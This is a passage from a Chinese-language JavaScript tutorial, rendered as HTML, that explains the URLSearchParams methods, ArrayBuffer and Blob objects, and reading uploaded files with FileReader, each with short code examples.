<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const params &#x3D; new URLSearchParams(&#123;foo: 1, bar: 2&#125;);</span><br><span class="line">fetch(&#39;https:&#x2F;&#x2F;example.com&#x2F;api&#39;, &#123;</span><br><span class="line">  method: &#39;POST&#39;,</span><br><span class="line">  body: params</span><br><span class="line">&#125;).then(...)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>fetch</code>命令向服务器发送命令时，可以直接使用<code>URLSearchParams</code>实例。</p>
<p><code>URLSearchParams</code>可以与<code>URL()</code>接口结合使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(window.location);</span><br><span class="line">var foo &#x3D; url.searchParams.get(&#39;foo&#39;) || &#39;somedefault&#39;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，URL 实例的<code>searchParams</code>属性就是一个<code>URLSearchParams</code>实例，所以可以使用<code>URLSearchParams</code>接口的<code>get</code>方法。</p>
<p><code>URLSearchParams</code>实例有遍历器接口，可以用<code>for...of</code>循环遍历（详见《ES6 标准入门》的《Iterator》一章）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line"></span><br><span class="line">for (var p of params) &#123;</span><br><span class="line">  console.log(p[0] + &#39;: &#39; + p[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; foo: 1</span><br><span class="line">&#x2F;&#x2F; bar: 2</span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>没有实例属性，只有实例方法。</p>
<h4 id="URLSearchParams-toString"><a href="#URLSearchParams-toString" class="headerlink" title="URLSearchParams.toString()"></a>URLSearchParams.toString()</h4><p><code>toString</code>方法返回实例的字符串形式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;https:&#x2F;&#x2F;example.com?foo&#x3D;1&amp;bar&#x3D;2&#39;);</span><br><span class="line">var params &#x3D; new URLSearchParams(url.search);</span><br><span class="line"></span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&#39;</span><br></pre></td></tr></table></figure>

<p>那么需要字符串的场合，会自动调用<code>toString</code>方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;version: 2.0&#125;);</span><br><span class="line">window.location.href &#x3D; location.pathname + &#39;?&#39; + params;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>location.href</code>赋值时，可以直接使用<code>params</code>对象。这时就会自动调用<code>toString</code>方法。</p>
<h4 id="URLSearchParams-append"><a href="#URLSearchParams-append" class="headerlink" title="URLSearchParams.append()"></a>URLSearchParams.append()</h4><p><code>append()</code>方法用来追加一个查询参数。它接受两个参数，第一个为键名，第二个为键值，没有返回值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.append(&#39;baz&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&amp;baz&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p><code>append()</code>方法不会识别是否键名已经存在。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.append(&#39;foo&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&amp;foo&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串里面<code>foo</code>已经存在了，但是<code>append</code>依然会追加一个同名键。</p>
<h4 id="URLSearchParams-delete"><a href="#URLSearchParams-delete" class="headerlink" title="URLSearchParams.delete()"></a>URLSearchParams.delete()</h4><p><code>delete()</code>方法用来删除指定的查询参数。它接受键名作为参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.delete(&#39;bar&#39;);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-has"><a href="#URLSearchParams-has" class="headerlink" title="URLSearchParams.has()"></a>URLSearchParams.has()</h4><p><code>has()</code>方法返回一个布尔值，表示查询字符串是否包含指定的键名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.has(&#39;bar&#39;) &#x2F;&#x2F; true</span><br><span class="line">params.has(&#39;baz&#39;) &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-set"><a href="#URLSearchParams-set" class="headerlink" title="URLSearchParams.set()"></a>URLSearchParams.set()</h4><p><code>set()</code>方法用来设置查询字符串的键值。</p>
<p>它接受两个参数，第一个是键名，第二个是键值。如果是已经存在的键，键值会被改写，否则会被追加。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&#39;);</span><br><span class="line">params.set(&#39;foo&#39;, 2);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;2&quot;</span><br><span class="line">params.set(&#39;bar&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;2&amp;bar&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>foo</code>是已经存在的键，<code>bar</code>是还不存在的键。</p>
<p>如果有多个的同名键，<code>set</code>会移除现存所有的键。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;foo&#x3D;2&#39;);</span><br><span class="line">params.set(&#39;foo&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>下面是一个替换当前 URL 的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; URL: https:&#x2F;&#x2F;example.com?version&#x3D;1.0</span><br><span class="line">var params &#x3D; new URLSearchParams(location.search.slice(1));</span><br><span class="line">params.set(&#39;version&#39;, &#39;2.0&#39;);</span><br><span class="line"></span><br><span class="line">window.history.replaceState(&#123;&#125;, &#39;&#39;, location.pathname + &#96;?&#96; + params);</span><br><span class="line">&#x2F;&#x2F; URL: https:&#x2F;&#x2F;example.com?version&#x3D;2.0</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-get-，URLSearchParams-getAll"><a href="#URLSearchParams-get-，URLSearchParams-getAll" class="headerlink" title="URLSearchParams.get()，URLSearchParams.getAll()"></a>URLSearchParams.get()，URLSearchParams.getAll()</h4><p><code>get()</code>方法用来读取查询字符串里面的指定键。它接受键名作为参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&#39;);</span><br><span class="line">params.get(&#39;foo&#39;) &#x2F;&#x2F; &quot;1&quot;</span><br><span class="line">params.get(&#39;bar&#39;) &#x2F;&#x2F; null</span><br></pre></td></tr></table></figure>

<p>两个地方需要注意。第一，它返回的是字符串，如果原始值是数值，需要转一下类型；第二，如果指定的键名不存在，返回值是<code>null</code>。</p>
<p>如果有多个的同名键，<code>get</code>返回位置最前面的那个键值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;3&amp;foo&#x3D;2&amp;foo&#x3D;1&#39;);</span><br><span class="line">params.get(&#39;foo&#39;) &#x2F;&#x2F; &quot;3&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串有三个<code>foo</code>键，<code>get</code>方法返回最前面的键值<code>3</code>。</p>
<p><code>getAll()</code>方法返回一个数组，成员是指定键的所有键值。它接受键名作为参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;foo&#x3D;2&#39;);</span><br><span class="line">params.getAll(&#39;foo&#39;) &#x2F;&#x2F; [&quot;1&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure>

<p>上面代码中，查询字符串有两个<code>foo</code>键，<code>getAll</code>返回的数组就有两个成员。</p>
<h4 id="URLSearchParams-sort"><a href="#URLSearchParams-sort" class="headerlink" title="URLSearchParams.sort()"></a>URLSearchParams.sort()</h4><p><code>sort()</code>方法对查询字符串里面的键进行排序，规则是按照 Unicode 码点从小到大排列。</p>
<p>该方法没有返回值，或者说返回值是<code>undefined</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;c&#x3D;4&amp;a&#x3D;2&amp;b&#x3D;3&amp;a&#x3D;1&#39;);</span><br><span class="line">params.sort();</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;a&#x3D;2&amp;a&#x3D;1&amp;b&#x3D;3&amp;c&#x3D;4&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，如果有两个同名的键<code>a</code>，它们之间不会排序，而是保留原始的顺序。</p>
<h4 id="URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries"><a href="#URLSearchParams-keys-，URLSearchParams-values-，URLSearchParams-entries" class="headerlink" title="URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()"></a>URLSearchParams.keys()，URLSearchParams.values()，URLSearchParams.entries()</h4><p>这三个方法都返回一个遍历器对象，供<code>for...of</code>循环遍历。它们的区别在于，<code>keys</code>方法返回的是键名的遍历器，<code>values</code>方法返回的是键值的遍历器，<code>entries</code>返回的是键值对的遍历器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;a&#x3D;1&amp;b&#x3D;2&#39;);</span><br><span class="line"></span><br><span class="line">for(var p of params.keys()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; a</span><br><span class="line">&#x2F;&#x2F; b</span><br><span class="line"></span><br><span class="line">for(var p of params.values()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 1</span><br><span class="line">&#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">for(var p of params.entries()) &#123;</span><br><span class="line">  console.log(p);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; [&quot;a&quot;, &quot;1&quot;]</span><br><span class="line">&#x2F;&#x2F; [&quot;b&quot;, &quot;2&quot;]</span><br></pre></td></tr></table></figure>

<p>如果直接对<code>URLSearchParams</code>进行遍历，其实内部调用的就是<code>entries</code>接口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (var p of params) &#123;&#125;</span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">for (var p of params.entries()) &#123;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ArrayBuffer-对象，Blob-对象"><a href="#ArrayBuffer-对象，Blob-对象" class="headerlink" title="ArrayBuffer 对象，Blob 对象"></a>ArrayBuffer 对象，Blob 对象</h2><h3 id="ArrayBuffer-对象"><a href="#ArrayBuffer-对象" class="headerlink" title="ArrayBuffer 对象"></a>ArrayBuffer 对象</h3><p>ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。这个对象可以看作内存数据的表达。</p>
<p>这个对象是 ES6 才写入标准的，普通的网页编程用不到它，为了教程体系的完整，下面只提供一个简略的介绍，详细介绍请看《ES6 标准入门》里面的章节。</p>
<p>浏览器原生提供<code>ArrayBuffer()</code>构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var buffer &#x3D; new ArrayBuffer(8);</span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>buffer</code>占用8个字节。</p>
<p>ArrayBuffer 对象有实例属性<code>byteLength</code>，表示当前实例占用的内存长度（单位字节）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var buffer &#x3D; new ArrayBuffer(8);</span><br><span class="line">buffer.byteLength &#x2F;&#x2F; 8</span><br></pre></td></tr></table></figure>

<p>ArrayBuffer 对象有实例方法<code>slice()</code>，用来复制一部分内存。它接受两个整数参数，分别表示复制的开始位置（从0开始）和结束位置（复制时不包括结束位置），如果省略第二个参数，则表示一直复制到结束。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var buf1 &#x3D; new ArrayBuffer(8);</span><br><span class="line">var buf2 &#x3D; buf1.slice(0);</span><br></pre></td></tr></table></figure>

<p>上面代码表示复制原来的实例。</p>
<h3 id="Blob-对象"><a href="#Blob-对象" class="headerlink" title="Blob 对象"></a>Blob 对象</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>Blob 对象表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件，它的名字是 Binary Large Object （二进制大型对象）的缩写。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。</p>
<p>浏览器原生提供<code>Blob()</code>构造函数，用来生成实例对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Blob(array [, options])</span><br></pre></td></tr></table></figure>

<p><code>Blob</code>构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的<code>Blob</code>实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性<code>type</code>，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var htmlFragment &#x3D; [&#39;&lt;a id&#x3D;&quot;a&quot;&gt;&lt;b id&#x3D;&quot;b&quot;&gt;hey!&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;];</span><br><span class="line">var myBlob &#x3D; new Blob(htmlFragment, &#123;type : &#39;text&#x2F;html&#39;&#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，实例对象<code>myBlob</code>包含的是字符串。生成实例的时候，数据类型指定为<code>text/html</code>。</p>
<p>下面是另一个例子，Blob 保存 JSON 数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj &#x3D; &#123; hello: &#39;world&#39; &#125;;</span><br><span class="line">var blob &#x3D; new Blob([ JSON.stringify(obj) ], &#123;type : &#39;application&#x2F;json&#39;&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="实例属性和实例方法"><a href="#实例属性和实例方法" class="headerlink" title="实例属性和实例方法"></a>实例属性和实例方法</h4><p><code>Blob</code>具有两个实例属性<code>size</code>和<code>type</code>，分别返回数据的大小和类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var htmlFragment &#x3D; [&#39;&lt;a id&#x3D;&quot;a&quot;&gt;&lt;b id&#x3D;&quot;b&quot;&gt;hey!&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;];</span><br><span class="line">var myBlob &#x3D; new Blob(htmlFragment, &#123;type : &#39;text&#x2F;html&#39;&#125;);</span><br><span class="line"></span><br><span class="line">myBlob.size &#x2F;&#x2F; 32</span><br><span class="line">myBlob.type &#x2F;&#x2F; &quot;text&#x2F;html&quot;</span><br></pre></td></tr></table></figure>

<p><code>Blob</code>具有一个实例方法<code>slice</code>，用来拷贝原来的数据，返回的也是一个<code>Blob</code>实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myBlob.slice(start, end, contentType)</span><br></pre></td></tr></table></figure>

<p><code>slice</code>方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为<code>size</code>属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。</p>
<h4 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h4><p>文件选择器<code>&lt;input type=&quot;file&quot;&gt;</code>用来让用户选取文件。出于安全考虑，浏览器不允许脚本自行设置这个控件的<code>value</code>属性，即文件必须是用户手动选取的，不能是脚本指定的。一旦用户选好了文件，脚本就可以读取这个文件。</p>
<p>文件选择器返回一个 FileList 对象，该对象是一个类似数组的成员，每个成员都是一个 File 实例对象。File 实例对象是一个特殊的 Blob 实例，增加了<code>name</code>和<code>lastModifiedDate</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; accept&#x3D;&quot;image&#x2F;*&quot; multiple onchange&#x3D;&quot;fileinfo(this.files)&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">function fileinfo(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var f &#x3D; files[i];</span><br><span class="line">    console.log(</span><br><span class="line">      f.name, &#x2F;&#x2F; 文件名，不含路径</span><br><span class="line">      f.size, &#x2F;&#x2F; 文件大小，Blob 实例属性</span><br><span class="line">      f.type, &#x2F;&#x2F; 文件类型，Blob 实例属性</span><br><span class="line">      f.lastModifiedDate &#x2F;&#x2F; 文件的最后修改时间</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了文件选择器，拖放 API 的<code>dataTransfer.files</code>返回的也是一个FileList 对象，它的成员因此也是 File 实例对象。</p>
<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>AJAX 请求时，如果指定<code>responseType</code>属性为<code>blob</code>，下载下来的就是一个 Blob 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function getBlob(url, callback) &#123;</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;GET&#39;, url);</span><br><span class="line">  xhr.responseType &#x3D; &#39;blob&#39;;</span><br><span class="line">  xhr.onload &#x3D; function () &#123;</span><br><span class="line">    callback(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send(null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>xhr.response</code>拿到的就是一个 Blob 对象。</p>
<h4 id="生成-URL"><a href="#生成-URL" class="headerlink" title="生成 URL"></a>生成 URL</h4><p>浏览器允许使用<code>URL.createObjectURL()</code>方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以<code>blob://</code>开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与<code>data://URL</code>（URL 包含实际数据）和<code>file://URL</code>（本地文件系统里面的文件）都不一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var droptarget &#x3D; document.getElementById(&#39;droptarget&#39;);</span><br><span class="line"></span><br><span class="line">droptarget.ondrop &#x3D; function (e) &#123;</span><br><span class="line">  var files &#x3D; e.dataTransfer.files;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var type &#x3D; files[i].type;</span><br><span class="line">    if (type.substring(0,6) !&#x3D;&#x3D; &#39;image&#x2F;&#39;)</span><br><span class="line">      continue;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; URL.createObjectURL(files[i]);</span><br><span class="line">    img.onload &#x3D; function () &#123;</span><br><span class="line">      this.width &#x3D; 100;</span><br><span class="line">      document.body.appendChild(this);</span><br><span class="line">      URL.revokeObjectURL(this.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码通过为拖放的图片文件生成一个 URL，产生它们的缩略图，从而使得用户可以预览选择的文件。</p>
<p>浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。</p>
<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>取得 Blob 对象以后，可以通过<code>FileReader</code>对象，读取 Blob 对象的内容，即文件内容。</p>
<p>FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。</p>
<ul>
<li><code>FileReader.readAsText()</code>：返回文本，需要指定文本编码，默认为 UTF-8。</li>
<li><code>FileReader.readAsArrayBuffer()</code>：返回 ArrayBuffer 对象。</li>
<li><code>FileReader.readAsDataURL()</code>：返回 Data URL。</li>
<li><code>FileReader.readAsBinaryString()</code>：返回原始的二进制字符串。</li>
</ul>
<p>下面是<code>FileReader.readAsText()</code>方法的例子，用来读取文本文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;readfile(this.files[0])&quot;&gt;&lt;&#x2F;input&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;pre id&#x3D;&quot;output&quot;&gt;&lt;&#x2F;pre&gt;</span><br><span class="line">function readfile(f) &#123;</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  reader.readAsText(f);</span><br><span class="line">  reader.onload &#x3D; function () &#123;</span><br><span class="line">    var text &#x3D; reader.result;</span><br><span class="line">    var out &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    out.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">    out.appendChild(document.createTextNode(text));</span><br><span class="line">  &#125;</span><br><span class="line">  reader.onerror &#x3D; function(e) &#123;</span><br><span class="line">    console.log(&#39;Error&#39;, e);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，通过指定 FileReader 实例对象的<code>onload</code>监听函数，在实例的<code>result</code>属性上拿到文件内容。</p>
<p>下面是<code>FileReader.readAsArrayBuffer()</code>方法的例子，用于读取二进制文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;typefile(this.files[0])&quot;&gt;&lt;&#x2F;input&gt;</span><br><span class="line">function typefile(file) &#123;</span><br><span class="line">  &#x2F;&#x2F; 文件开头的四个字节，生成一个 Blob 对象</span><br><span class="line">  var slice &#x3D; file.slice(0, 4);</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  &#x2F;&#x2F; 读取这四个字节</span><br><span class="line">  reader.readAsArrayBuffer(slice);</span><br><span class="line">  reader.onload &#x3D; function (e) &#123;</span><br><span class="line">    var buffer &#x3D; reader.result;</span><br><span class="line">    &#x2F;&#x2F; 将这四个字节的内容，视作一个32位整数</span><br><span class="line">    var view &#x3D; new DataView(buffer);</span><br><span class="line">    var magic &#x3D; view.getUint32(0, false);</span><br><span class="line">    &#x2F;&#x2F; 根据文件的前四个字节，判断它的类型</span><br><span class="line">    switch(magic) &#123;</span><br><span class="line">      case 0x89504E47: file.verified_type &#x3D; &#39;image&#x2F;png&#39;; break;</span><br><span class="line">      case 0x47494638: file.verified_type &#x3D; &#39;image&#x2F;gif&#39;; break;</span><br><span class="line">      case 0x25504446: file.verified_type &#x3D; &#39;application&#x2F;pdf&#39;; break;</span><br><span class="line">      case 0x504b0304: file.verified_type &#x3D; &#39;application&#x2F;zip&#39;; break;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(file.name, file.verified_type);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-对象，FileList-对象，FileReader-对象"><a href="#File-对象，FileList-对象，FileReader-对象" class="headerlink" title="File 对象，FileList 对象，FileReader 对象"></a>File 对象，FileList 对象，FileReader 对象</h2><h3 id="File-对象"><a href="#File-对象" class="headerlink" title="File 对象"></a>File 对象</h3><p>File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。</p>
<p>最常见的使用场合是表单的文件上传控件（<code>&lt; input type=&quot;file&quot;&gt;</code>），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。</p>
